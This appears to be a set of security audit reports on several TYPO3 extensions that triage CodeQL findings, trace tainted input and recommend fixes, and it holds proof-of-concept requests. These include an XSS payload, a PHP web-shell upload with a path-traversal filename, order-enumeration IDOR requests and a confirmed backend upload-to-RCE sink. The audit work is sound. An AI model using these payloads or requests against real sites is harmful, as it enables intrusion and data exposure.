  $fieldConfig[...]['additionalWhere'] = 'tx_tagpack_tags.pid IN(' . $request['pid'] . ')';
  ```
  fed to `exec_SELECTquery()` at `:224/:262/:275` via `join(' AND ', $conditions)`.
- **Tainted path:** `$_GET['pid']` (`main(t3lib_div::_GET())` at `:414`) → raw concat into
  WHERE. Also `$request['id']` / `$request['value']` (search term via
  `$this->db->searchQuery()`).
- **Assessment:** Real injection but requires a valid BE session, so it is a
  privilege-limited authenticated finding, not the requested pre-auth class. Worth
  fixing (cast `pid` to an int list) but low practical risk.

---

## Not vulnerable / false positives

- **pi3 (`uid IN(...)`)** — `pi3:56-67`: `$tagUid` derives from
  `t3lib_div::intExplode(',', piVars['uid'])` then `implode` → integers only. Safe.
  The `$table` values in dynamic SQL come from TypoScript `$conf` (admin), not request.
- **pi1 SQL (`searchWord`)** — `pi1:96/136`: wrapped in
  `$GLOBALS['TYPO3_DB']->fullQuoteStr(...)`; other numeric filters use `intval()`.
  Not SQL-injectable.
- **`pi3` date filters** — `strtotime()` coerced. Safe.
- **`ext_localconf.php:6` `unserialize($_EXTCONF)`** — `$_EXTCONF` is the extension
  configuration blob (admin-managed), not attacker input → not a request-reachable
  object-injection. False positive for a pre-auth deserialization bug.
- **pi2** — returns a static "Hello World" debug dump; no user data in SQL/HTML sink.
- **`mod1/index.php`, `class.tx_tagpack_tceforms_addtags.php`** — backend module /
  TCEforms hooks; not pre-auth. `exec_UPDATEquery`/`exec_INSERTquery` there operate on
  backend-edited records.

## Advisory cross-reference

No specific published TYPO3-EXT-SA identified. The extension targets end-of-life
TYPO3 4.x and is itself long unmaintained (v0.13.0); the pi1 reflected XSS is the only
request-reachable, unauthenticated issue.

### ehaerer_eh-bootstrap

#### TARGET B — ehaerer/eh_bootstrap — ExtbaseDispatcher (eID)

**CodeQL claim:** Reflected XSS at `Classes/Eid/ExtbaseDispatcher.php:155`

## VERDICT: FALSE POSITIVE

Version: **1.0.4** (`ext_emconf.php:41`, `state => stable`, TYPO3 7.6.0–8.99.99)

---

## 1. Sink analysis
`Classes/Eid/ExtbaseDispatcher.php:155`
```php
echo $response->getContent();
```
This is an eID script with no `Content-Type` header set → default `text/html`,
so the echoed bytes are markup (not `application/json`). The echoed content is
the **Fluid-rendered output of an Extbase controller action**, not raw request
input.

## 2. Backward trace / tainted chain
Request source and what it controls:
- `:72  $ajax = GeneralUtility::_GP('request');`  → `$_GET`/`$_POST['request']` (fully attacker-controlled array)
- `:79–80` vendor/extensionName are **hard-coded** to `EHAERER` / `EhBootstrap` (attacker cannot redirect to another extension's controllers)
- `:81–89` controller (default `Abstract`), action (default `render`), arguments (default `[]`) — taken from `$ajax`, i.e. attacker-controlled
- `:142–147` those values are pushed onto the Extbase request (`setControllerName`, `setControllerActionName`, `setArguments`, `setPluginName`)
- `:154 $dispatcher->dispatch(...)` → `:155 echo $response->getContent()`

CodeQL joins `_GP('request')` → `setArguments()` → `getContent()` → `echo`.
The break in the chain: **no reachable controller action assigns the tainted
arguments to the view**, so they never appear in `getContent()`.

Only one controller exists in the extension:
`Classes/Controller/AbstractController.php` (confirmed: `ls Classes/Controller/`
shows only `AbstractController.php`). Its actions:
- `renderAction()` (`:91–107`) — the eID default action. Reads `exampleUid`
  argument but the body is commented out and it assigns `example = NULL`
  (`:98,:103`). Only `example` (NULL) and `emSettings` reach the view.
- `pluginAction()` (`:74–81`) — assigns `emSettings` only.
- `moduleAction()` (`:116–124`) — assigns literal `'example'` + `emSettings`.

`emSettings` = `unserialize($GLOBALS['TYPO3_CONF_VARS']['EXT']['extConf']['eh_bootstrap'])`
(`AbstractController.php:65`) — admin-only Extension Manager config, **not request input.**

Templates confirm no reflection (`Resources/Private/Templates/Abstract/`):
- `Render.html` — outputs only `<f:for each="{emSettings}">{k} : {em}` (Fluid
  auto-escaped, admin-sourced).
- `Plugin.html` / `PluginPreview.html` — static markup only.

So the request-controlled `arguments` never reach the echoed HTML, and even the
values that do render (`emSettings`) are Fluid-auto-escaped and not
attacker-controlled. No `htmlspecialchars`-bypass path exists because the
tainted data is simply never emitted.

(Note: supplying an unmapped controller/action just makes `dispatch()` throw
*before* line 155 executes, so the `echo` is never reached with attacker-chosen
controller names — the error path is handled by TYPO3's core exception handler,
not this `echo`.)

## 3. Reachability / auth
- Registered as an **eID** in `ext_localconf.php:21`:
  ```php
  $GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['ehBootstrap'] = ...ExtbaseDispatcher.php';
  ```
  eID entry points are **pre-auth / unauthenticated** frontend endpoints
  (`index.php?eID=ehBootstrap`). So reachability/auth is not the mitigant —
  the mitigant is that no tainted value is reflected.
- (Extension targets TYPO3 7.6–8.99; on that stack the eID is invocable
  anonymously.)

## 4. Trigger request (nominal — does NOT yield XSS)
```
POST /index.php?eID=ehBootstrap HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded

request[pluginName]=ehbs&request[controller]=Abstract&request[action]=render&request[arguments][exampleUid]=<script>alert(1)</script>
```
→ `Abstract::renderAction` ignores `exampleUid` (assigns NULL) and renders
`Render.html`, which emits only Fluid-escaped `emSettings`. The injected
payload never appears in the response body.

**Conclusion: FALSE POSITIVE** — CodeQL's taint reaches `echo`, but the only
reachable controller actions (`Abstract::render`/`plugin`) never assign the
request-controlled `arguments` to the view; the rendered template outputs only
admin-configured `emSettings`, Fluid-auto-escaped. No request input is reflected
into the HTML.

### extcode_cart

#### Security Audit — `extcode/cart` (Shopping Cart for TYPO3)

- **Target**: `/home/user/sources/code/typo3-extensions/extcode_cart`
- **Version**: `12.0.0` (composer.json) — latest major line, TYPO3 v13
- **Scope**: Pre-auth frontend e-commerce flow (add-to-cart / update / coupon / checkout / order create / order view). Money- and PII-relevant logic.
- **Date**: 2026-08-04

## Pre-auth attack surface (frontend Extbase plugins, from `ext_localconf.php`)

| Plugin | Controller::actions | Auth |
|---|---|---|
| `Cart` | `CartController` show/clear/update; `CountryController` update; `CouponController` add/remove; `CurrencyController` update; `Cart\OrderController` show/create; `PaymentController` update; `ProductController` add/remove | none (pre-auth) |
| `MiniCart` | `CartPreviewController` show; `CurrencyController` update | none |
| `Currency` | `CurrencyController` edit/update | none |
| `Order` | `Order\OrderController` list/show | none in code; relies on integrator putting plugin behind FE login |

AJAX add-to-cart is a normal Extbase plugin call selected by `pageType`/typeNum (`2278001`/`2278003`) — no separate eID/unauthenticated endpoint. No raw SQL; repositories use Extbase query builder (parameterized). JSON responses use `json_encode` with `application/json` — no reflected XSS in AJAX path.

---

## Findings

### FINDING 1 — Anonymous disclosure of all guest orders via Order list (missing login guard)
- **SEVERITY**: MEDIUM
- **PRE-AUTH**: Yes (when the `Order` plugin is on a page not access-restricted by the integrator — the extension itself imposes no login requirement)
- **Type**: Broken access control / IDOR-by-default
- **Source**: `Classes/Controller/Order/OrderController.php:43-44` (`listAction`)
- **Sink / query**: `ItemRepository::findBy(['feUser' => $feUserUid])`
- **Tainted path**:
  - `$feUserUid = $this->context->getPropertyFromAspect('frontend.user', 'id');` → for an **anonymous** visitor this is `0`.
  - `ext_tables.sql:271` `fe_user int(11) DEFAULT '0' NOT NULL` — **guest checkouts persist `fe_user = 0`** (`EventListener/Order/Create/PersistOrder/Item.php:45-53` only sets `feUser` when `isLoggedIn()`).
  - `findBy(['feUser' => 0])` therefore matches **every guest order** in the storage folder.
- **Exploitability**: An unauthenticated user loading the Order-history plugin (page type `list`) is served a paginated table of *all* guest orders. `Order/Order/List.html` leaks per order: order number, order date, invoice number, invoice date, and **total gross**. Order-number enumeration also feeds order lookups elsewhere. No CSRF/token needed — plain GET.
- **PoC**: Browse to the page holding the `Cart Order` (list) plugin while logged out: `GET /order-history/`. If any guest orders exist, they are listed. `?tx_cart_order[@widget_0][currentPage]=N` pages through the full set.
- **Note / related DoS**: `showAction` (`OrderController.php:71-72`) guards with `$orderItem->getFeUser()->getUid() !== $feUserUid`. For a guest order `getFeUser()` is `null`, so `null->getUid()` throws a `TypeError` (500) — the show view of a guest order is a hard error rather than an info leak, but the same null-deref is reachable by any caller passing a guest order's `__identity`.
- **Fix**: Reject `$feUserUid === 0` (require `frontend.user` `isLoggedIn()`) in both `listAction` and `showAction`; null-check `getFeUser()` before `getUid()`.

### FINDING 2 — `Cart\OrderController::showAction` has no ownership check (order-number IDOR)
- **SEVERITY**: LOW
- **PRE-AUTH**: Yes
- **Type**: Missing object-level authorization (IDOR)
- **Source/sink**: `Classes/Controller/Cart/OrderController.php:140-147`
```php
public function showAction(Item $orderItem): ResponseInterface {
    $this->view->assign('orderItem', $orderItem);   // no owner/session check
    ...
}
```
- **Tainted path**: Extbase property mapping loads the persisted `Item` by `tx_cart_cart[orderItem][__identity]=<uid>` (identity load ignores storage pid). Unlike `Order\OrderController::showAction`, there is **no** `feUser`/session comparison.
- **Exploitability**: Limited by the template. `Resources/Private/Templates/Cart/Order/Show.html` renders only `{orderItem.orderNumber}` ("thank you") — so the leak is confirming/enumerating order numbers for arbitrary order UIDs, not full PII. Still a genuine authorization gap on a money object.
- **PoC**: `GET /cart/?tx_cart_cart[controller]=Order&tx_cart_cart[action]=show&tx_cart_cart[orderItem][__identity]=123` → returns the order number of order 123.
- **Fix**: Load the confirmed order from session (order just created) or compare `feUser`/a per-order token instead of trusting `__identity`.

### FINDING 3 — Negative cart quantities accepted (cart-total manipulation, business logic)
- **SEVERITY**: LOW (conditional)
- **PRE-AUTH**: Yes
- **Type**: Business-logic / input validation
- **Source**: `Classes/Controller/Cart/CartController.php:144-162` (`updateAction`, `quantities` request array)
- **Sink**: `Classes/Domain/Model/Cart/Product.php:356-366` `changeQuantity(int $newQuantity)` — only `=== 0` is special-cased; **negative values are stored** and flow into `reCalc()` (negative line net/gross).
- **Tainted path**: `quantities[<productId>] = -N` → `changeQuantity(-N)` → negative `getGross()` contribution to cart total.
- **Exploitability**: Requires the product already in the cart and depends on the stock/availability handler (provided by companion product extensions such as `cart_products`) not rejecting negatives — the default `CheckProductAvailabilityEvent` in this repo has no listener, so nothing rejects it. Downward total manipulation is only monetizable if the payment/gateway integration honors a reduced/negative total; most gateways reject non-positive charges, which is why this is rated LOW rather than a confirmed price bypass. Honest assessment: a hardening gap, not a proven free-checkout.
- **Fix**: Clamp `$newQuantity < 1` (treat as removal or reject) in `changeQuantity`/`changeQuantities` and validate `quantities` in `updateAction`.

---

## Reviewed and found NOT exploitable (pre-auth)

- **Object injection via `unserialize`** — `Service/SessionHandler.php:44,86` `unserialize()` operates only on **server-side FE session** data the app itself wrote (`fe_session`/`ses`), not on request input, and the result is type-checked (`instanceof Cart` / `AddressInterface`). Not attacker-controlled → not exploitable. (Gadget risk would only matter if the session store were separately writable.)
- **Object injection via coupon type** — `Controller/Cart/CouponController.php:49` `class_implements($couponType)` + `GeneralUtility::makeInstance($couponType, ...)` uses `couponType` from the **admin-created Coupon DB record**, not the request (`couponCode` only selects a coupon). Not request-controlled.
- **Currency price manipulation** — `EventListener/Cart/UpdateCurrency.php`: request supplies only `currencyCode`, matched against the TypoScript-configured currency list; the exchange `translation` factor is read from server config, never the request. No client-controlled price factor.
- **SQL injection** — `ItemRepository::getFilterConstraints` (`like('%'.$value.'%')`, `strtotime`) is Extbase-parameterized **and** only reachable from the **backend** (authenticated) order search (`Controller/Backend/Order/OrderController.php`). Not pre-auth, not injectable.
- **Open redirect / SSRF in payment return** — `Cart\OrderController::createAction:127-133` redirects to `paymentSettings['options'][$paymentId]['redirects']['success']['url']`, which is **TypoScript-configured server-side**, not request-derived. `PaymentController::updateAction` only selects a configured, availability-checked payment method by id. No request-controlled URL.
- **Price trust on add-to-cart** — `ProductController::addAction` delegates product construction to `RetrieveProductsFromRequestEvent`, which has **no listener in this extension**; the price/product-data source lives in companion product-type extensions (e.g. `cart_products`). Price-manipulation exposure must be audited there, not here. Flagged as an architectural dependency.
- **Mass assignment on Order/Address** — `OrderController::initializeCreateAction` maps `orderItem/billingAddress/shippingAddress`; totals/`feUser`/`pid` are overwritten server-side in `PersistOrder/Item.php:55-62` from the session cart (`setGross/setTotalGross` from `$cart`), so client-posted totals do not survive into the persisted order.

## Known CVEs
- No published CVE or TYPO3-EXT-SA advisory was found specifically for `extcode/cart`. Version `12.0.0` is the current major line. The changelog contains no security-labeled entries. Findings above are original to this review, not tracked advisories.

Sources: [extcode/cart GitHub](https://github.com/extcode/cart), [TYPO3 Security Advisories](https://typo3.org/help/security-advisories)

### felixnagel_pluploadfe

#### felixnagel/pluploadfe — `Classes/Middleware/Upload.php`

## Verdict: FALSE POSITIVE (path traversal) / NEEDS-CONFIG (arbitrary-upload → RCE, and even then blocked by TYPO3 fileDenyPattern)

The reported path-traversal at lines 326/336/353/371 does **not** survive: the only
attacker-controlled path component is the filename, and `getFileName()` strips every
directory separator before it reaches the sink. RCE via a dangerous extension is
gated by an admin allow-list **and** TYPO3's `FileNameValidator` (fileDenyPattern).

---

## 1. Sinks and the path argument

`$filePath` is built once at **line 323**:
```php
$filePath = $this->uploadPath . DIRECTORY_SEPARATOR . $this->getFileName();
```
and flows into the filesystem ops:
- **326** `@fopen(sprintf('%s.part',$filePath), 'ab'|'wb')` — write (create temp part)
- **336** `@fopen($_FILES['file']['tmp_name'],'rb')` — read (the uploaded temp, PHP-controlled, not the target)
- **353** `rename($filePath.'.part', $filePath)` — final write/move
- **371** `@unlink($filePath)` — delete (only a file this request just created)

The tainted path component is `getFileName()`; `uploadPath` is the second component.

## 2. Backward taint trace + confinement

**Filename source → sink**
```
Upload.php:267-268  $filename = $_REQUEST['name']          // attacker input
Upload.php:270      $filename = $_FILES['file']['name']    // attacker input (fallback)
Upload.php:273      return preg_replace('#[^\w\._]+#', '_', $filename)   // SANITIZER
Upload.php:323      $filePath = $this->uploadPath . '/' . $this->getFileName()
Upload.php:326/353/371  fopen / rename / unlink($filePath)
```
`preg_replace('#[^\w\._]+#','_', ...)` keeps only `[A-Za-z0-9_]` + literal `.`.
Every `/`, `\`, and NUL is replaced with `_`. `../../etc/passwd` becomes
`.._.._etc_passwd`. **No directory separator can survive**, so the filename cannot
traverse or contain an absolute path. Path traversal via filename is dead.

**Destination dir (`uploadPath`) source** — all non-request or sanitized:
```
Upload.php:160  getUploadDir($config['upload_path'], getUserDirectory(), $config['obscure_dir'])
  - config['upload_path']  : DB config record (admin), FAL-resolved (line 250-252),
                             validated by Filesystem::isPathValid → GeneralUtility::isAllowedAbsPath
                             under Environment::getPublicPath() (Filesystem.php:31, checkUploadConfig:223)
  - getUserDirectory()     : FE-user DB record fields, sanitized preg_replace('#[^0-9a-zA-Z\-\.]#','_')
                             (line 214) — from the user's own record, no '/' possible
  - obscure_dir            : Filesystem::getRandomDirName() (random_int)
  - chunk_path (line 282)  : read from server-written FE session, not request
```
None of the destination components accept a request-supplied slash. Traversal killed.

## 3. pluploadfe-specific checks
- **(a) Auth gate:** anonymous is *possible*. `process()` fires whenever `tx_pluploadfe`
  (query or body) is present (line 56) and method is POST. A valid, non-hidden, in-window
  `tx_pluploadfe_config` record must exist (getUploadConfig:231-241). Per-config
  `feuser_required` (line 149) decides whether a FE user session is needed — if `0`, upload
  is fully anonymous; if `1`, a valid FE login is required.
- **(b) Dangerous filename:** `getFileName()` preserves dots, so `evil.php` is a *lexically*
  valid stored name. But `FileValidation::checkFileExtension()` (line 157) enforces (i) the
  admin `extensions` CSV allow-list, **and** (ii) `FileNameValidator->isValid()` — TYPO3's
  core `fileDenyPattern`, which by default rejects `.php`, `.phtml`, `.phar`, etc. even if an
  admin adds `php` to the allow-list. Chunk assembly (`chunk`/`chunks`, lines 154/319-320)
  only casts to `(int)` and the target path still uses the same sanitized `getFileName()`
  (line 283) + session-stored `chunk_path` — no traversal is introduced.
- **(c) Destination dir:** `{public}/{config.upload_path}[/{userDir}][/{randomDir}]`, always
  confined under `Environment::getPublicPath()` via `isAllowedAbsPath`.

## 4. Reachability / auth level
Registered in `Configuration/RequestMiddlewares.php` under `frontend`, `after
typo3/cms-frontend/authentication`. In the FE PSR-15 stack, reachable **pre-auth** when the
matching config record has `feuser_required = 0`. Trigger: `POST` with `tx_pluploadfe=<uid>`.

## 5. Version / compat
`ext_emconf.php`: version **9.0.3-dev**, requires PHP 8.2–8.4, **TYPO3 14.2.0–14.3.99**.

---

## Why not CONFIRMED
- Path traversal (the reported finding): the filename sanitizer at `Upload.php:273` removes
  all `/`, `\`, NUL — no separator reaches lines 326/336/353/371. **FALSE POSITIVE.**
- Arbitrary write / RCE: destination confined under public path; dangerous extensions blocked
  by admin allow-list **and** core `FileNameValidator`/`fileDenyPattern`. Would require an
  admin to both allow an executable extension and weaken the global fileDenyPattern —
  a misconfiguration, not a middleware traversal bug. **NEEDS-CONFIG, strongly mitigated.**

## Representative request (does NOT escape)
```
POST /?tx_pluploadfe=1 HTTP/1.1
Host: victim
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="name"

../../../../var/www/html/shell.php
--X
Content-Disposition: form-data; name="file"; filename="x"

<?php system($_GET['c']); ?>
--X--
```
Stored filename becomes `.._.._.._.._var_www_html_shell.php` inside the configured upload dir
(no traversal); and `checkFileExtension` rejects `.php` via fileDenyPattern before any write.

### friendsoftypo3_rtehtmlarea

#### friendsoftypo3_rtehtmlarea — SpellCheckingController command injection

**Verdict: FALSE POSITIVE (command injection).**
Every request-derived value on the aspell command line is wrapped in `escapeshellarg()`; the aspell binary path is admin-only configuration, not request input. Additionally the endpoint is a **backend-authenticated** AJAX route (not pre-auth), and the line-299 sink is further gated on a valid `BE_USER`.

## Sinks

`Classes/Controller/SpellCheckingController.php`

### Line 299 — `shell_exec($aspellCommand)` (the `cmd === 'learn'` branch)

Command assembled at lines 292-298:

```php
$aspellCommand = ((TYPO3_OS === 'WIN') ? 'type ' : 'cat ') . escapeshellarg($tmpFileName) . ' | '
    . $this->AspellDirectory                                              // admin config, not request
    . ' -a --mode=none'
    . ($this->personalDictionaryPath ? ' --home-dir=' . escapeshellarg($this->personalDictionaryPath) : '')
    . ' --lang='     . escapeshellarg($this->dictionary)
    . ' --encoding=' . escapeshellarg($mainDictionaryCharacterSet)
    . ' 2>&1';
```

Every interpolated value is escaped:
- `$tmpFileName` — server-generated (`GeneralUtility::tempnam`), `escapeshellarg`.
- `$this->personalDictionaryPath` — derived from BE user uid / FAL folder, `escapeshellarg`.
- `$this->dictionary` — from `_POST('dictionary')` (`:210`) but **validated against the aspell dict allow-list** (`:214`, falls back to `'en'`) **and** `escapeshellarg`'d.
- `$mainDictionaryCharacterSet` — read from a dictionary `.dat` file, `escapeshellarg`.
- `$this->AspellDirectory` — `$GLOBALS['TYPO3_CONF_VARS']['EXTCONF']['rtehtmlarea']['plugins']['SpellChecker']['AspellDirectory']` (`:188`), an **instance-admin config value**, defaulting to `/usr/bin/aspell`. Not reachable from the HTTP request.

No unescaped request-controlled data enters the command line. No injection.

### Line 393 — `shell_exec($aspellCommand)` in `setMainDictionaryPath()`

```php
$aspellCommand = $this->AspellDirectory . ' config dict-dir';   // :392
$aspellResult = shell_exec($aspellCommand);                     // :393
```

Composed solely from `$this->AspellDirectory` (admin config) plus a constant string. Zero request input. Not injectable.

(The other `shell_exec`s — `:192`, `:197`, `:200`, and `:643` in `spellCheckHandler` — are the same story: only `$this->AspellDirectory` config plus `escapeshellarg`'d user parts.)

## Backward trace / sanitizers

- `dictionary`: `GeneralUtility::_POST('dictionary')` (`:210`) -> allow-list check `in_array($this->dictionary, $dictionaryArray)` (`:214`) -> `escapeshellarg` (`:296`, `:640`). Killed twice over.
- `pspell_mode`, `pspell_charset`, `content`, `editorId`, `restrictToDictionaries`, `to_p_dict`, `to_r_list`: none reach a shell argument unescaped (`pspellMode` is `escapeshellarg`'d at `:638`; `content` goes only to the XML parser; `editorId` goes only to `quoteJSvalue` HTML output).
- aspell path: config, not request-derived.

`escapeshellarg` on the language/encoding/path + fixed aspell binary from admin config = command injection not reachable.

## Reachability / auth — CRUCIAL

- Registered in `Configuration/Backend/AjaxRoutes.php:13-16` as backend AJAX route `rtehtmlarea_spellchecker`, path `/rte/spellchecker`, target `SpellCheckingController::processRequest`.
- **No `access => public`** on the route -> TYPO3 backend RouteDispatcher requires a valid `be_user` session. **This is a backend-only, authenticated endpoint — NOT pre-auth.** The RTE itself only runs in the backend.
- The line-299 `learn` branch adds a second gate: `if (TYPO3_MODE !== 'BE' || !is_object($GLOBALS['BE_USER'])) { die(''); }` (`:259-261`).

Even for an authenticated backend user there is no command injection (all args escaped). A backend-only route also means this is not pre-auth by any path.

## Version

`ext_emconf.php`: **rtehtmlarea 8.7.4**, `state = obsolete`.
Constraints: TYPO3 `8.7.0-8.7.99`.
(Note: `ext_emconf` namespace is `TYPO3\CMS\Rtehtmlarea` — the former core RTE extracted to friendsoftypo3.)

## Conclusion

FALSE POSITIVE for command injection at both `:299` and `:393`. The historical `aspell` shell-out is present, but the language/dictionary/encoding/path arguments are `escapeshellarg`-escaped and the aspell executable path comes from server admin configuration rather than the request. Not exploitable, and in any case only reachable behind a backend session.

### friendsoftypo3_tt-address

#### Security Audit — friendsoftypo3/tt_address

**Version audited:** 10.0.1 (ext_emconf.php), TYPO3 v13.4.20–14.4 line
**Scope:** pre-auth exploitable vulnerabilities reachable from an unauthenticated frontend HTTP request.
**Summary:** No pre-auth exploitable vulnerability found. The extension exposes only two Extbase frontend actions (`list`, `show`) — no eID, no middleware, no AJAX route, no vCard/CSV export code (the "vcard" strings are schema.org CSS classes only). All list/detail querying goes through the Extbase QueryBuilder with typed constraints; the historically dangerous `sortBy`/orderBy path is allow-listed against `$GLOBALS['TCA']` columns; there is no raw-`where` reachable from request input, no request-driven `unserialize`, and no frontend outbound HTTP (SSRF). The request-driven `overrideDemand` property mass-assignment is bounded and gated behind a disabled-by-default setting.

---

## Pre-auth attack surface map

| Surface | Entry point | Auth | Notes |
|---|---|---|---|
| Address list | `AddressController::listAction(?array $override)` | pre-auth | demand built from TS settings; `$override` gated by `allowOverride` |
| Address detail | `AddressController::showAction(?Address $address)` | pre-auth | Extbase model by uid |
| Geocoding | `GeocodeService` / `GeocodeCommand` / `LocationMapWizard` | backend/CLI only | not frontend-reachable |
| Category resolve | `CategoryService` | via list demand | int-exploded, parameterized |

No `Configuration/RequestMiddlewares.php`, no eID registration, no reaction handler exist in this extension.

---

## Findings (traced source → sink)

### 1. Filter / sortBy / category / search params → SQLi — NOT vulnerable
- **Severity:** None · **Pre-auth:** Yes (surface), not exploitable
- **Source:** `tx_ttaddress_listview[override][...]` → `AddressController::listAction(?array $override)` (`Classes/Controller/AddressController.php:74`) → `overrideDemand()` (`:176`).
- **Gate + sinks:**
  - The entire override path only runs when `!empty($override) && $this->settings['allowOverride']` (`:84`); `allowOverride` is a plugin/flexform setting that is **off by default**.
  - `singleRecords` and `pages` are explicitly unset from `$override` (`:178-183`).
  - `sortBy` is **allow-listed**: dropped unless `isset($GLOBALS['TCA']['tt_address']['columns'][$override['sortBy']])` (`:186-188`). It then reaches `QueryInterface::setOrderings([$sortBy => $order])` in `AddressRepository::createDemandQuery` (`Classes/Domain/Repository/AddressRepository.php:58`) and `getAddressesByCustomSorting` (`:133`) — a validated TCA column name that Extbase maps to a quoted identifier.
  - Remaining override-able properties are set via `ObjectAccess::setProperty($demand, ...)` (`:195`) into the typed `Demand` DTO (`Classes/Domain/Model/Dto/Demand.php`): `categories` (string → `GeneralUtility::intExplode` → `$query->contains`), `sortOrder` (only `strtolower()===\'desc\'` compared), `categoryCombination`, booleans. All flow into Extbase QueryBuilder constraints (`in`/`contains`/`equals`) with bound parameters — no string concatenation into SQL.
- **Exploitability:** None. Even with `allowOverride` enabled, `sortBy` is column-allow-listed and every other value is parameterized. (This is the corrected form of the historical tt_address orderBy SQLi class — the allow-list is the fix and it is present here.)

### 2. Address detail IDOR — by-design, low/informational
- **Severity:** Low/Informational · **Pre-auth:** Yes
- **Source:** `tx_ttaddress_listview[address]` → `showAction(?Address $address)` (`Classes/Controller/AddressController.php:46`).
- **Behavior:** storage-folder scoping (`checkPidOfAddressRecord`, `:265`) is only enforced when `settings.detail.checkPidOfAddressRecord` is enabled (`:50`). Otherwise any address uid can be rendered regardless of the plugin's configured storage folder.
- **Exploitability:** Addresses are public content records and Extbase enableFields still filter hidden/deleted/access-restricted rows, so this at most lets a visitor view a *published* address that lives in a different folder than the plugin intended. No private data crosses a trust boundary; note as configuration hardening only.

### 3. vCard / CSV export → header / path injection — NOT present
- **Severity:** None · **Pre-auth:** N/A
- **Trace:** grep for `vcard/csv/Content-Disposition/fopen/getSqlQuery` finds only: schema.org `class="vcard"` in `Resources/Private/Partials/ListItem.html`, `Full.html`, `Resources/Public/LegacyPluginTemplate/default.html`; and `AddressRepository::getSqlQuery()` (`Classes/Domain/Repository/AddressRepository.php:102`) which is called **only from tests**. There is no export controller/action, no response-header sink fed by request input.
- **Exploitability:** None — the export attack surface does not exist in this version.

### 4. XSS in rendered address fields — NOT pre-auth
- **Severity:** None · **Pre-auth:** No
- **Trace:** address fields are backend/editor-managed (no frontend create/edit flow exists). Templates contain **no** `f:format.raw` / `|raw` (grep clean); Fluid auto-escapes all output. Any stored XSS would require TYPO3 backend editor access.

### 5. SSRF via geocoding — NOT pre-auth
- **Severity:** None · **Pre-auth:** No
- **Trace:** `GeocodeService::getUrl()` sink at `Classes/Service/GeocodeService.php:157` (`GeneralUtility::getUrl($url)`) is invoked from `GeocodeCommand` (CLI) and the `LocationMapWizard` backend FormEngine control / TCA save, using a configured geocoding provider URL plus record address fields. It is not triggered by an unauthenticated frontend request. The `stripLogicalOperatorPrefix($addWhereClause)` at `:81` derives from TCA/TypoScript config, not request input.

### 6. Object injection / unserialize — NOT present
- No `unserialize()` of request data in `Classes/`. Extbase property mapping into `Address`/`Demand` is type-constrained.

---

## Known CVEs / advisories cross-reference

- **Historical class — orderBy/sortBy SQL injection (TYPO3-EXT-SA, older tt_address 2.x–4.x):** the sort parameter once reached `ORDER BY` without validation. **Mitigated here**: `AddressController::overrideDemand()` allow-lists `sortBy` against `$GLOBALS['TCA']['tt_address']['columns']` (`Classes/Controller/AddressController.php:186`) before it can reach `setOrderings`. Not exploitable in 10.0.1.
- **Historical class — reflected/stored XSS in list/detail output:** current templates carry no raw-output view helpers and rely on Fluid escaping; no request-reflected sink found.
- No public CVE is known to affect **tt_address 10.0.1** (current release for TYPO3 v13.4/v14). No remediation required for the pre-auth threat model; the only hardening suggestion is enabling `detail.checkPidOfAddressRecord` where folder scoping of detail views is desired (Finding 2).

### gdpr-extensions-com_gdpr-extensions-com-gmap

#### Security Audit — gdpr-extensions-com / gdpr_extensions_com_gmap

- **Extension key:** `gdpr_extensions_com_gmap` (composer/title: "GDPR-Extensions-com - Google Map 2xClick Solution")
- **Version:** 1.0.3 (`ext_emconf.php:11`)
- **TYPO3 compat:** 11.5.0 – 12.4.99 (`ext_emconf.php:14`)
- **Audited file:** `Classes/Controller/GdprManagerController.php` (+ registration in `ext_localconf.php`, `ext_tables.php`, `Configuration/Backend/Modules.php`, and the FE controller `GdprGooglemapsController.php`)

## Controller auth level — the decisive question

`GdprManagerController` (which contains `uploadImageAction`, `listAction`, `updateAction`, `deleteAction`) is registered in **two** ways, and only the backend one exposes the dangerous actions:

1. **Backend module** — `Configuration/Backend/Modules.php:19-31` (TYPO3 v12) and `ext_tables.php:30-45` (`registerModule`, v≤11). Sub-module `gdprgooglemaps`, `access => 'user,group'`, `controllerActions` = `list, index, show, new, create, edit, update, delete, uploadImage`. → **requires an authenticated `be_user`** who has the module.
2. **Frontend plugin** — `ext_localconf.php:5-17` `configurePlugin('GdprExtensionsComGmap','gdprgooglemaps', …)`. The **1st (authoritative) controllerActions array lists only** `GdprGooglemapsController => 'index'`. `GdprManagerController` appears **only in the 2nd (non-cacheable) array** (`create, update, delete`).

In TYPO3 v11/v12 `ExtensionUtility::configurePlugin()` iterates the **first** array to register plugin controllers; a controller present only in the non-cacheable array is **never registered** and its actions are **not routable** from the frontend. Therefore, via the frontend plugin, only `GdprGooglemapsController::indexAction` (read-only map render, `GdprGooglemapsController.php:65`) is reachable. `uploadImage`, `list`, `update`, `delete`, `create` are **not** frontend-reachable.

No other pre-auth entry point exists: there is **no `eID`**, **no `Configuration/Backend/AjaxRoutes.php`**, and `uploadImage` appears in no routing/plugin config (verified by grep). The `uriFor('uploadImage')` calls (`:130,:172,:207`) only build backend-module URLs consumed by the module's own templates/JS.

**Conclusion: every sensitive action, including the file upload, is backend-authenticated. Nothing here is reachable pre-auth.**

---

## Issue B1 — Unrestricted file upload → RCE in `uploadImageAction` → **CONFIRMED, but BACKEND-authenticated (NOT pre-auth)**

Sink, `Classes/Controller/GdprManagerController.php:290-313`:
```php
if (!empty($_FILES['image']) && $_FILES['image']['error'] === UPLOAD_ERR_OK) {
    $twoClickFolder = Environment::getPublicPath().'/fileadmin/user_upload/two_click_solution/';
    ...
    $originalFileName = basename($_FILES['image']['name']);
    $fileExtension    = pathinfo($originalFileName, PATHINFO_EXTENSION);   // attacker-controlled ext
    $newFileName      = $fileHash . '.' . $fileExtension;                  // md5.<ext>
    $targetPath       = $twoClickFolder . $newFileName;
    if (move_uploaded_file($filePath, $targetPath)) { ...                  // no allow-list, no fileDenyPattern
```

Tainted chain: `$_FILES['image']['name']` → `pathinfo(..., PATHINFO_EXTENSION)` (`:302`) → `$newFileName` (`:303`) → `move_uploaded_file()` (`:307`) into web-servable `fileadmin/user_upload/two_click_solution/`.

- **No extension allow-list / no MIME check.** The filename extension is taken verbatim; `x.php`/`x.phtml` is written as `<md5>.php`.
